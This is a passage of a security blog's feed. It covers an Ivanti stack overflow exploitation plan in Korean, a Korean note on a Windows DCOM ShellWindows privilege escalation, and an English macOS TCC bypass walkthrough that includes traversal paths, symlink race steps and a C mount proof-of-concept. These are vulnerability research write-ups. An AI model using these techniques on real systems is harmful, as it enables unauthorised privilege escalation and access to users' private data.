class="hljs-built_in">void</span> (__cdecl **)(<span class="hljs-built_in">int</span>, __int16 *))(*(_DWORD *)a1 + <span class="hljs-number">0x48</span>))(a1, &amp;v22);<span class="hljs-comment">//[3]  </span>    isValid = <span class="hljs-number">1</span>;    EPMessage::~EPMessage((EPMessage *)v18);    DSUtilMemPool::~DSUtilMemPool((DSUtilMemPool *)object_to_be_freed);<span class="hljs-comment">//[4]</span>    <span class="hljs-keyword">return</span> isValid;}</code></pre><p><code>[1]</code>&#xC5D0;&#xC11C;&#xB294; &#xD328;&#xD0B7;&#xC5D0; <code>key=value</code> &#xD615;&#xD0DC;&#xB85C; &#xC800;&#xC7A5;&#xB41C; &#xB370;&#xC774;&#xD130; &#xC911;&#xC5D0;&#xC11C;&#xB3C4; <code>clientCapabilities</code>&#xC758; &#xAC12;&#xC744; &#xAC00;&#xC838;&#xC624;&#xACE0; <code>[2]</code>&#xC5D0;&#xC11C;&#xB294; &#xC774;&#xB97C; <code>dest</code>&#xB85C; &#xBCF5;&#xC0AC;&#xD558;&#xACE0; &#xC774;&#xB54C; <code>strcpy</code>&#xAC00; &#xC544;&#xB2CC; <code>strncpy</code>&#xB97C; &#xC0AC;&#xC6A9;&#xD574;&#xC11C; &#xBCF5;&#xC0AC;&#xB420; &#xBB38;&#xC790;&#xC5F4;&#xC758; &#xCD5C;&#xB300; &#xAE38;&#xC774;&#xB97C; &#xC81C;&#xD55C;&#xD558;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC5B8;&#xB73B; &#xBCF4;&#xBA74; &#xC548;&#xC804;&#xD55C; &#xCF54;&#xB4DC;&#xCC98;&#xB7FC; &#xBCF4;&#xC774;&#xC9C0;&#xB9CC; <code>strncpy</code>&#xC758; &#xAE38;&#xC774;&#xB97C; &#xB370;&#xC774;&#xD130;&#xAC00; &#xBCF5;&#xC0AC;&#xB420; &#xBC84;&#xD37C;&#xC778; <code>dest</code>&#xC758; &#xAE38;&#xC774;&#xC778; 256&#xC774; &#xC544;&#xB2C8;&#xB77C; &#xBCF5;&#xC0AC;&#xB420; &#xB370;&#xC774;&#xD130;&#xC758; &#xAE38;&#xC774;&#xC778; <code>clientCapabilitiesLength</code>&#xB85C; &#xC0AC;&#xC6A9;&#xD588;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; <code>clientCapabilities</code>&#xC758; &#xAE38;&#xC774;&#xAC00; 256&#xBCF4;&#xB2E4; &#xD06C;&#xB2E4;&#xBA74; Stack-based Buffer Overflow&#xAC00; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xC774;&#xB54C;&#xC758; &#xC2A4;&#xD0DD;&#xC758; &#xAD6C;&#xC870;&#xB294; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;</p><pre><code class="hljs asciidoc"><span class="hljs-code">+---------------------+</span> &lt;- esp~                     ~<span class="hljs-code">+---------------------+</span>| v18 (int)           |<span class="hljs-code">+---------------------+</span>| v19 (int)           |<span class="hljs-code">+---------------------+</span>| dest[256]           | &lt;- 256 bytes<span class="hljs-code">+---------------------+</span>| object<span class="hljs-emphasis">_to_</span>be<span class="hljs-emphasis">_freed  | &lt;- 4 bytes</span><span class="hljs-emphasis">+---------------------+</span><span class="hljs-emphasis">| ptr (void *)        |</span><span class="hljs-emphasis">+---------------------+</span><span class="hljs-emphasis">| v20 (int)           |</span><span class="hljs-emphasis">+---------------------+</span><span class="hljs-emphasis">| v21 (int)           |</span><span class="hljs-emphasis">+---------------------+</span><span class="hljs-emphasis">| v22 (int)           |</span><span class="hljs-emphasis">+---------------------+</span><span class="hljs-emphasis">| v23 (char)          |</span><span class="hljs-emphasis">+---------------------+</span><span class="hljs-emphasis">| v24 (char)          |</span><span class="hljs-emphasis">+---------------------+</span><span class="hljs-emphasis">| v25 (void *)        |</span><span class="hljs-emphasis">+---------------------+</span><span class="hljs-emphasis">| v26[499]            | &lt;- 499 DWORDs (4 bytes each)</span><span class="hljs-emphasis">+---------------------+</span><span class="hljs-emphasis">| Return Address      |</span><span class="hljs-emphasis">+---------------------+</span><span class="hljs-emphasis">| int a1              |</span><span class="hljs-emphasis">+---------------------+</span><span class="hljs-emphasis">| IftTlsHeader *a2    |</span><span class="hljs-emphasis">+---------------------+</span><span class="hljs-emphasis"></span><span class="hljs-emphasis"></span></code></pre><p>&#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xC0DD;&#xD55C; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xC778; <code>/home/bin/web</code>&#xC740; stack canary&#xAC00; &#xC801;&#xC6A9;&#xB418;&#xC5B4; &#xC788;&#xC9C0; &#xC54A;&#xC9C0;&#xB9CC; Overflow&#xAC00; &#xBC1C;&#xC0DD;&#xD558;&#xB294; &#xBC84;&#xD37C;&#xC778; <code>dest</code> &#xBC14;&#xB85C; &#xC774;&#xD6C4;&#xC5D0; &#xC704;&#xCE58;&#xD55C; <code>object_to_be_freed</code>&#xAC00; &#xC704; &#xD568;&#xC218;&#xC758; &#xC5D0;&#xD544;&#xB85C;&#xADF8; &#xC9C1;&#xC804;(<code>[4]</code>)&#xC5D0; <code>free</code>&#xB418;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xD574;&#xB2F9; &#xBD80;&#xBD84;&#xC744; &#xC720;&#xD6A8;&#xD55C; &#xAC12;&#xC73C;&#xB85C; &#xC804;&#xB2EC;&#xD558;&#xC9C0; &#xBABB;&#xD558;&#xBA74; &#xBCC0;&#xC870;&#xB41C; return address&#xB85C; <code>ret</code> &#xD558;&#xAE30; &#xC804;&#xC5D0; &#xD06C;&#xB798;&#xC2DC;&#xAC00; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xB530;&#xB77C;&#xC11C; &#xC2A4;&#xD0DD;&#xC5D0; &#xC874;&#xC7AC;&#xD558;&#xB294; <code>a1</code>&#xC744; &#xB36E;&#xC5B4;&#xC4F0;&#xACE0; <code>[3]</code>&#xC5D0;&#xC11C; &#xBCC0;&#xC870;&#xB41C; <code>a1</code>&#xC758; vftable&#xC744; &#xD1B5;&#xD574; &#xBC1C;&#xC0DD;&#xD558;&#xB294; &#xAC04;&#xC811;&#xD638;&#xCD9C;&#xC744; &#xC774;&#xC6A9;&#xD574;&#xC57C;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xC704; &#xC2A4;&#xD0DD;&#xC5D0;&#xC11C; <code>a1</code>&#xC744; &#xB36E;&#xC5B4;&#xC4F0;&#xBA74; <code>[3]</code>&#xC5D0;&#xC11C; &#xD574;&#xB2F9; &#xC8FC;&#xC18C;&#xC758; 4&#xBC14;&#xC774;&#xD2B8;&#xB97C; vftable&#xC758; &#xC8FC;&#xC18C;&#xB85C; &#xAC00;&#xC838;&#xC624;&#xACE0; &#xB2E4;&#xC2DC; &#xD574;&#xB2F9; &#xC8FC;&#xC18C;&#xC5D0; 0x48&#xC744; &#xB354;&#xD55C; &#xC8FC;&#xC18C;&#xC5D0;&#xC11C; &#xAC00;&#xC838;&#xC628; &#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB97C; &#xD1B5;&#xD574; <code>add esp</code>&#xCC98;&#xB7FC; esp&#xAC00; <code>dest</code> &#xC774;&#xD6C4;&#xB97C; &#xAC00;&#xB9AC;&#xD0A4;&#xAC8C; &#xB9CC;&#xB4E4; stack pivot &#xAC00;&#xC82F;&#xC744; &#xD638;&#xCD9C;&#xD558;&#xACE0; ROP Chain&#xC744; &#xC2E4;&#xD589;&#xD558;&#xB294; &#xAC83;&#xC774; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;. &#xD558;&#xC9C0;&#xB9CC; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xC5D0;&#xB294; ASLR&#xACFC; PIE&#xAC00; &#xC801;&#xC6A9;&#xB418;&#xC5B4; &#xC788;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xC131;&#xACF5;&#xC801;&#xC778; &#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787;&#xC5D0;&#xB294; &#xBE0C;&#xB8E8;&#xD2B8; &#xD3EC;&#xC2F1;&#xC774; &#xD544;&#xC694;&#xB85C; &#xD569;&#xB2C8;&#xB2E4;.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/RCE/">RCE</category>
      
      <category domain="https://hackyboiz.github.io/tags/Ivanti/">Ivanti</category>
      
      <category domain="https://hackyboiz.github.io/tags/pwndorei/">pwndorei</category>
      
      <category domain="https://hackyboiz.github.io/tags/stack-buffer-overflow/">stack buffer overflow</category>
      
      
      <comments>https://hackyboiz.github.io/2025/01/25/pwndorei/2025-01-25/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2024-38100: Windows File Explorer Elevation of Privilege Vulnerability</title>
      <link>https://hackyboiz.github.io/2025/01/22/ogu123/cve-2024-38100/</link>
      <guid>https://hackyboiz.github.io/2025/01/22/ogu123/cve-2024-38100/</guid>
      <pubDate>Wed, 22 Jan 2025 08:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://decoder.cloud/2024/08/02/the-fake-potato/&quot;&gt;https:</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://decoder.cloud/2024/08/02/the-fake-potato/">https://decoder.cloud/2024/08/02/the-fake-potato/</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>windows_server_2016 Up to (excluding)10.0.14393.7159</li><li>windows_server_2019 Up to (excluding)10.0.17763.6054</li><li>windows_server_2022 Up to (excluding)10.0.20348.2582</li><li>windows_server_2022_23h2 Up to (excluding)10.0.25398.1009</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Windows server&#xC758; &#xD30C;&#xC77C; &#xD0D0;&#xC0C9;&#xAE30;(explorer) &#xD504;&#xB85C;&#xC138;&#xC2A4; &#xB0B4;&#xC5D0; &#xC874;&#xC7AC;&#xD558;&#xB294; DCOM &#xAC1D;&#xCCB4;&#xB97C; &#xD1B5;&#xD574; &#xAD8C;&#xD55C; &#xC0C1;&#xC2B9; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xC0DD;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xCDE8;&#xC57D;&#xC810;&#xC740; Explorer&#xAC00; High Integrity Level&#xB85C; &#xC2E4;&#xD589;&#xB420; &#xB54C;, Access Security&#xC5D0; &#xBD88;&#xD544;&#xC694;&#xD55C; &#xAD8C;&#xD55C;&#xC774; &#xC788;&#xC5B4; &#xBC1C;&#xC0DD;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2025/01/22/ogu123/cve-2024-38100/image1.png" alt></p><p>CLSID &#xAC12; {9BA05972-F6A8-11CF-A442-00A0C90A8F39}&#xC778; ShellWindows&#xB294; Explorer &#xB0B4;&#xC5D0; &#xC874;&#xC7AC;&#xD558;&#xB294; DCOM &#xAC1D;&#xCCB4;&#xC785;&#xB2C8;&#xB2E4;.</p><p>ShellWindows&#xC758; Identity&#xB97C; &#xD655;&#xC778;&#xD558;&#xBA74;, Interactive user&#xC774;&#xBBC0;&#xB85C; &#xB85C;&#xADF8;&#xC778;&#xD55C; &#xC0AC;&#xC6A9;&#xC790; &#xC138;&#xC158;&#xACFC; &#xB3D9;&#xC77C;&#xD55C; &#xBCF4;&#xC548; &#xCEE8;&#xD14D;&#xC2A4;&#xD2B8;&#xB85C; &#xAC1D;&#xCCB4;&#xAC00; &#xC2E4;&#xD589;&#xB429;&#xB2C8;&#xB2E4;.</p><p><img src="/2025/01/22/ogu123/cve-2024-38100/image2.png" alt></p><p>Launch and Activation&#xC744; &#xD655;&#xC778;&#xD558;&#xBA74;, INTERACTIVE&#xC758; &#xBAA8;&#xB4E0; &#xAD8C;&#xD55C;&#xC774; &#xC788;&#xC73C;&#xBBC0;&#xB85C; &#xB85C;&#xADF8;&#xC778;&#xD55C; &#xC0AC;&#xC6A9;&#xC790;&#xB294; &#xD574;&#xB2F9; &#xAC1D;&#xCCB4;&#xB97C; &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2025/01/22/ogu123/cve-2024-38100/image3.png" alt></p><p>CLSID&#xB97C; &#xD1B5;&#xD574; ShellWindows&#xB97C; &#xC778;&#xC2A4;&#xD134;&#xC2A4;&#xD654;&#xD55C; &#xD6C4;, &#xAD6C;&#xD604;&#xB41C; &#xBA54;&#xC18C;&#xB4DC;&#xB97C; &#xC0B4;&#xD3B4;&#xBCF4;&#xBA74; &#xAD8C;&#xD55C; &#xC0C1;&#xC2B9;&#xC5D0; &#xD544;&#xC694;&#xD55C; <code>ShellExecute</code> &#xBA54;&#xC18C;&#xB4DC;&#xB97C; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2025/01/22/ogu123/cve-2024-38100/image4.png" alt></p><p>OleView.NET &#xB3C4;&#xAD6C;&#xB97C; &#xD1B5;&#xD574; High Integrity Level&#xB85C; &#xC2E4;&#xD589;&#xB418;&#xB294; Explorer &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC758; Access Security&#xB97C; &#xC0B4;&#xD3B4;&#xBCF4;&#xBA74;, Authenticated Users&#xC758; Execute &#xAD8C;&#xD55C;&#xC774; &#xC788;&#xB294; &#xAC83;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2025/01/22/ogu123/cve-2024-38100/image5.png" alt></p><p>&#xCDE8;&#xC57D;&#xC810;&#xC740; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC774; COM Cross-Session Activation&#xC744; &#xD1B5;&#xD574; &#xD2B8;&#xB9AC;&#xAC70; &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ul><li>user1&#xC774; <code>BindToMoniker</code> &#xBA54;&#xC18C;&#xB4DC;&#xB97C; &#xD1B5;&#xD574; &#xC138;&#xC158; 2(administrator)&#xC758; ShellWindows DCOM &#xAC1D;&#xCCB4;&#xB97C; &#xC0DD;&#xC131;&#xD569;&#xB2C8;&#xB2E4;.</li><li>Access Security&#xC640; Launch and Activation Permissions&#xC5D0;&#xC11C; &#xAD8C;&#xD55C; &#xAC80;&#xC99D;&#xC744; &#xC218;&#xD589;&#xD558;&#xB294;&#xB370; &#xAC01;&#xAC01; Authenticated Users&#xC758; Execute &#xAD8C;&#xD55C;&#xC640; INTERACTIVE &#xD3EC;&#xD568;&#xB418;&#xC5B4; &#xC788;&#xC5B4; &#xAC1D;&#xCCB4;&#xAC00; &#xC0DD;&#xC131;&#xB429;&#xB2C8;&#xB2E4;.</li><li>ShellWindows&#xB294; Interactive user&#xC774;&#xBBC0;&#xB85C; &#xC138;&#xC158; 2&#xC758; &#xAD8C;&#xD55C;&#xC778; administrator&#xB85C; &#xC0DD;&#xC131;&#xB429;&#xB2C8;&#xB2E4;.</li><li>user1&#xC5D0;&#xC11C; <code>ShellExecute</code> &#xBA54;&#xC18C;&#xB4DC;&#xB97C; &#xD1B5;&#xD574; &#xB9AC;&#xBC84;&#xC2A4; &#xC258;&#xC744; &#xC2E4;&#xD589;&#xD558;&#xC5EC; &#xAD8C;&#xD55C; &#xC0C1;&#xC2B9;&#xC744; &#xD2B8;&#xB9AC;&#xAC70; &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</li></ul><p><img src="/2025/01/22/ogu123/cve-2024-38100/image6.png" alt></p><p>&#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC740; Explorer&#xAC00; High Integrity Level &#xC2E4;&#xD589;&#xB420; &#xB54C;, Authenticated Users &#xADF8;&#xB8F9;&#xC758; &#xAD8C;&#xD55C;&#xC774; &#xC0AD;&#xC81C;&#xB418;&#xB294; &#xAC83;&#xC73C;&#xB85C; &#xD328;&#xCE58; &#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-38100">https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-38100</a></li><li><a href="https://nvd.nist.gov/vuln/detail/cve-2024-38100">https://nvd.nist.gov/vuln/detail/cve-2024-38100</a></li></ul>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/LPE/">LPE</category>
      
      <category domain="https://hackyboiz.github.io/tags/ogu123/">ogu123</category>
      
      <category domain="https://hackyboiz.github.io/tags/ShellWindows/">ShellWindows</category>
      
      <category domain="https://hackyboiz.github.io/tags/DCOM/">DCOM</category>
      
      <category domain="https://hackyboiz.github.io/tags/explorer/">explorer</category>
      
      
      <comments>https://hackyboiz.github.io/2025/01/22/ogu123/cve-2024-38100/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Research] MacOS TCC Bypass (en)</title>
      <link>https://hackyboiz.github.io/2025/01/19/clalxk/MacOS_TCC-Bypass_en/</link>
      <guid>https://hackyboiz.github.io/2025/01/19/clalxk/MacOS_TCC-Bypass_en/</guid>
      <pubDate>Sun, 19 Jan 2025 08:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;&lt;img src=&quot;/2025/01/19/clalxk/MacOS_TCC-Bypass_en/TCC_Bypass.png&quot; alt=&quot;image.png&quot;&gt;&lt;/p&gt;
&lt;p&gt;Dreaming of becoming a future Apple picker, I&amp;#x</description>
        
      
      
      
      <content:encoded><![CDATA[<p><img src="/2025/01/19/clalxk/MacOS_TCC-Bypass_en/TCC_Bypass.png" alt="image.png"></p><p>Dreaming of becoming a future Apple picker, I&#x2019;m back with another macOS vulnerability&#x2014;this time, a TCC Bypass! &#x1F34F;</p><p>&#x1F517; <strong>Related post:</strong> <a href="https://hackyboiz.github.io/2024/11/27/clalxk/CVE-2024-44175/">CVE-2024-44175 - macOS <code>diskarbitrationd</code> Sandbox Escape</a></p><p>In my previous post, I covered a vulnerability in the <code>diskarbitrationd</code> system daemon that allowed attackers to bypass the sandbox or elevate privileges through filesystem manipulation.</p><p>Today, we&#x2019;re diving into <strong>CVE-2024-40855</strong>, another flaw in <code>diskarbitrationd</code> that not only <strong>escapes the sandbox</strong> but also allows mounting into the user&#x2019;s <strong>Transparency, Consent, and Control (TCC)</strong> directory. This vulnerability exploits a <strong>Directory Traversal attack</strong> in <code>diskarbitrationd</code>.</p><hr><h1 id="1-TCC-Bypass"><a href="#1-TCC-Bypass" class="headerlink" title="1. TCC Bypass?"></a>1. TCC Bypass?</h1><p>Transparency, Consent, and Control (TCC) is <strong>Apple&#x2019;s security framework</strong> that governs app permissions for accessing <strong>sensitive user data</strong>. Users can manage these permissions via the <code>Settings</code> app.</p><p><img src="/2025/01/19/clalxk/MacOS_TCC-Bypass_en/image1.png" alt="image.png"></p><p>Ever seen a popup asking, <em>&#x201C;Do you want to allow microphone access?&#x201D;</em>?</p><p>That&#x2019;s TCC in action&#x2014;macOS&#x2019;s <strong>app permission management system</strong>.</p><p>A <strong>TCC Bypass</strong> occurs when an attacker gains unauthorized access to sensitive user data (e.g., photos, microphone, location) <strong>without the user&#x2019;s consent</strong>.</p><h1 id="2-Vulnerability-Overview"><a href="#2-Vulnerability-Overview" class="headerlink" title="2. Vulnerability Overview"></a>2. Vulnerability Overview</h1><h3 id="CVE-2024-40855"><a href="#CVE-2024-40855" class="headerlink" title="CVE-2024-40855"></a>CVE-2024-40855</h3><blockquote><p>A directory traversal vulnerability in diskarbitrationd, a macOS system daemon, allows an attacker to bypass TCC protections by mounting unauthorized paths.</p></blockquote><h3 id="Version-Information"><a href="#Version-Information" class="headerlink" title="Version Information"></a><strong>Version Information</strong></h3><p>macOS : 13.0 &#x2264; 14.6</p><h3 id="diskarbitrationd"><a href="#diskarbitrationd" class="headerlink" title="diskarbitrationd"></a><strong>diskarbitrationd</strong></h3><p>The <code>diskarbitrationd</code> daemon has three key characteristics:</p><ul><li>Runs <strong>as root</strong></li><li>Accessible <strong>from within the sandbox</strong></li><li>Has the <strong><code>com.apple.private.security.storage-exempt.heritable</code></strong> attribute, effectively granting it <strong>Full Disk Access</strong></li></ul><p>Because of these, Apple implements <strong>strict validation mechanisms</strong> to prevent sandbox escapes and unauthorized mounting to TCC-protected directories.</p><p>Sandbox validation includes:</p><ol><li><strong>Mount Path Validation</strong><ul><li>The client-side logic checks for <code>../</code> (directory traversal) and ensures <strong>path resolution</strong> does not bypass security checks (e.g., via symlink attacks).</li></ul></li><li><strong>Sandbox Verification</strong><ul><li><code>diskarbitrationd</code> calls <code>sandbox_check_by_audit_token</code> to determine if the requesting process has access to the specified files/directories.</li></ul></li><li><strong>Kernel-Level Mount Validation</strong><ul><li>The kernel enforces additional restrictions on external mount requests, rejecting any paths containing symbolic links when the <code>k</code> option is used.</li></ul></li></ol><p>These three layers of validation are supposed to prevent sandbox escapes and unauthorized TCC access.</p><h3 id="&#x1F525;-Bypassing-Client-Side-Mount-Path-Validation"><a href="#&#x1F525;-Bypassing-Client-Side-Mount-Path-Validation" class="headerlink" title="&#x1F525; Bypassing Client-Side Mount Path Validation"></a>&#x1F525; Bypassing Client-Side Mount Path Validation</h3><p>The flaw lies in the <strong>first step</strong>&#x2014;Mount Path Validation.</p><p>This check happens <strong>on the client-side</strong> within Apple&#x2019;s <code>DiskArbitration</code> framework, specifically in the function <code>DADiskMountWithArgumentsCommon</code>. An attacker can <strong>completely bypass this validation</strong> by skipping <code>DiskArbitration</code> and calling <code>diskarbitrationd</code> <strong>directly</strong>.</p><p>By doing this, the attacker can:</p><p>&#x2705; <strong>Pass a mount path containing <code>../</code> elements</strong></p><p>&#x2705; <strong>Bypass sandbox checks</strong></p><p>&#x2705; <strong>Bypass symlink restrictions</strong></p><p>Here&#x2019;s the relevant part of the <code>DADiskMountWithArgumentsCommon</code> function:</p><pre><code class="hljs c"><span class="hljs-function">__private_extern__ <span class="hljs-keyword">void</span> <span class="hljs-title">DADiskMountWithArgumentsCommon</span><span class="hljs-params">( DADiskRef disk,</span></span><span class="hljs-function"><span class="hljs-params">                               CFURLRef            path,</span></span><span class="hljs-function"><span class="hljs-params">                               DADiskMountOptions  options,</span></span><span class="hljs-function"><span class="hljs-params">                               DADiskMountCallback callback,</span></span><span class="hljs-function"><span class="hljs-params">                               <span class="hljs-keyword">void</span> *              context,</span></span><span class="hljs-function"><span class="hljs-params">                               CFStringRef         arguments[],</span></span><span class="hljs-function"><span class="hljs-params">                               <span class="hljs-keyword">bool</span>                block )</span></span><span class="hljs-function"></span>{...    <span class="hljs-keyword">if</span> ( path )    {        <span class="hljs-keyword">char</span> * _path;        _path = ___CFURLCopyFileSystemRepresentation( path );        <span class="hljs-keyword">if</span> ( _path )        {            <span class="hljs-keyword">char</span> name[MAXPATHLEN];            <span class="hljs-keyword">if</span> ( realpath( _path, name ) )            {                path = CFURLCreateFromFileSystemRepresentation( kCFAllocatorDefault, ( <span class="hljs-keyword">void</span> * ) name, <span class="hljs-built_in">strlen</span>( name ), TRUE );            }            <span class="hljs-keyword">else</span>            {                CFRetain( path );            }            <span class="hljs-built_in">free</span>( _path );        }        <span class="hljs-keyword">else</span>        {            CFRetain( path );        }    }    status = kDAReturnBadArgument;    <span class="hljs-keyword">if</span> ( disk )    {        status = _DAAuthorize( _DADiskGetSession( disk ), _kDAAuthorizeOptionIsOwner, disk, _kDAAuthorizeRightMount );        <span class="hljs-keyword">if</span> ( status == kDAReturnSuccess )        {            status = __DAQueueRequest( _DADiskGetSession( disk ), _kDADiskMount, disk, options, path ? CFURLGetString( path ) : <span class="hljs-literal">NULL</span>, argument, callback, context, block );        }    }...}</code></pre><p>In the code above, the <code>realpath</code> and <code>CFURLCreateFromFileSystemRepresentation</code> function calls are responsible for stripping <code>../</code> elements. However, since this validation occurs on the client side, an attacker can completely bypass it by calling <code>diskarbitrationd</code> directly. By skipping the <code>DiskArbitration</code> framework and passing a path containing <code>../</code> elements directly to <code>diskarbitrationd</code>, it becomes possible to evade sandbox restrictions and mount a TCC-protected directory.</p><p>These functions sanitize paths <strong>only on the client side</strong>. If an attacker <strong>calls <code>diskarbitrationd</code> directly</strong>, they can inject a <code>../</code> traversal attack <strong>before validation occurs</strong>.</p><h3 id="Explain-1-Mounting-Library-Application-Support-com-apple-TCC"><a href="#Explain-1-Mounting-Library-Application-Support-com-apple-TCC" class="headerlink" title="Explain 1 : Mounting ~/Library/Application Support/com.apple.TCC"></a>Explain 1 : Mounting <code>~/Library/Application Support/com.apple.TCC</code></h3><p>Let&#x2019;s walk through how to exploit this vulnerability to mount the user&#x2019;s <strong>TCC directory</strong> and modify <code>TCC.db</code>.</p><p><strong>Step 1: Call <code>DAMount</code> with a Traversal Path</strong></p><pre><code class="hljs bash">/private/tmp/starthere/../../../Users/crab/Library/Application Support/com.apple.TCC</code></pre><p>We provide a crafted path with <code>../</code> elements.</p><p>&#x26A0;&#xFE0F; <strong>Key Trick:</strong> Ensure the client does not interpret the path before it reaches <code>diskarbitrationd</code>.</p><p><strong>Step 2: Manipulate Symlinks During <code>sandbox_check_by_audit_token</code> Execution</strong></p><p>1&#xFE0F;&#x20E3; Create a symbolic link</p><pre><code class="hljs bash">/private/tmp/starthere -&gt; /private/tmp/1/2/3</code></pre><p>2&#xFE0F;&#x20E3; When <code>sandbox_check_by_audit_token</code> checks the path, the following <strong>unexpected transformation</strong> occurs:</p><pre><code class="hljs bash">/private/tmp/Users/crab/Library/Application Support/com.apple.TCC</code></pre><p>3&#xFE0F;&#x20E3; Next, create a directory structure that <strong>mimics</strong> the expected validation path:</p><pre><code class="hljs bash">/private/tmp/1/2/3/../../../Users/crab/Library/Application Support/com.apple.TCC/private/tmp/Users/crab/Library/Application Support/com.apple.TCC</code></pre><p>As a result, this path is allowed to be mounted inside <code>/private/tmp/</code>, enabling it to pass security checks.</p><p><strong>3. Remove the Symbolic Link and Execute the Mount</strong></p><pre><code class="hljs bash">/private/tmp/**starthere**/../../../Users/crab/Library/Application Support/com.apple.TCC</code></pre><p>Once the <code>sandbox_check_by_audit_token</code> check is complete, delete the symbolic link and replace it with an empty directory. After that, <code>diskarbitrationd</code> will execute the external mount command again, using the same path as before.</p><pre><code class="hljs bash">/Users/crab/Library/Application Support/com.apple.TCC</code></pre><p>However, this time, <code>starthere</code> is a <strong>directory</strong> instead of a <strong>symbolic link</strong>, meaning the final transformation remains the same as before.</p><p>Since the path no longer contains a symbolic link, the <strong>kernel will process it as a regular path</strong>. Moreover, because the calling process is <code>diskarbitrationd</code>, which possesses the <code>com.apple.private.security.storage-exempt.heritable</code> privilege, it is able to <strong>bypass the kernel&#x2019;s Mandatory Access Control Framework (MACF) Sandbox checks</strong>. As a result, this method works even within the sandbox.</p><p><strong>4. TCC Bypass and Sandbox Escape</strong></p><p>By following <strong>steps 1&#x2013;3</strong>, you can successfully perform a <strong>TCC Bypass</strong>.</p><p>To further <strong>escape the sandbox</strong>, you can <strong>mount the <code>~/Library/Preferences</code> directory</strong> using a similar technique. By doing so, you can place a custom Terminal preference file that <strong>automatically executes specific commands</strong> when Terminal is opened.</p><p>In essence, this vulnerability is a <strong>Time of Check to Time of Use (TOCTOU) bug</strong>, functioning similarly to the vulnerability described in <a href="https://hackyboiz.github.io/2024/11/27/clalxk/CVE-2024-44175/">a previous post</a>.</p><hr><h3 id="Explain-2"><a href="#Explain-2" class="headerlink" title="Explain 2"></a>Explain 2</h3><p>Let&#x2019;s replicate <strong>Explain 1</strong> using a debugger.</p><pre><code class="hljs c"><span class="hljs-meta">#import <span class="hljs-meta-string">&lt;DiskArbitration/DiskArbitration.h&gt;</span></span><span class="hljs-meta">#import <span class="hljs-meta-string">&lt;Foundation/Foundation.h&gt;</span></span><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span> </span>{    DASessionRef session = DASessionCreate(kCFAllocatorDefault);    DADiskRef disk = DADiskCreateFromBSDName(kCFAllocatorDefault, session, <span class="hljs-string">&quot;/dev/disk6s1&quot;</span>);    CFDictionaryRef properties;    CFURLRef diskurl = (__bridge CFURLRef)[NSURL fileURLWithPath:@<span class="hljs-string">&quot;/dev/disk6s1&quot;</span>];    CFURLRef url = (__bridge CFURLRef)[NSURL fileURLWithPath:@<span class="hljs-string">&quot;/private/tmp/starthere/../../../Users/crab/Library/Application Support/com.apple.TCC&quot;</span>];    DADiskMount(disk, url, kDADiskMountOptionDefault, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;}</code></pre><p>The code above attempts to mount a disk at the path:</p><p><code>/private/tmp/starthere/../../../Users/crab/Library/Application Support/com.apple.TCC</code>.</p><p>Compile the code, start debugging using <code>lldb</code>, and set the following breakpoints:</p><pre><code class="hljs bash">(lldb) breakpoint listCurrent breakpoints:1: name = <span 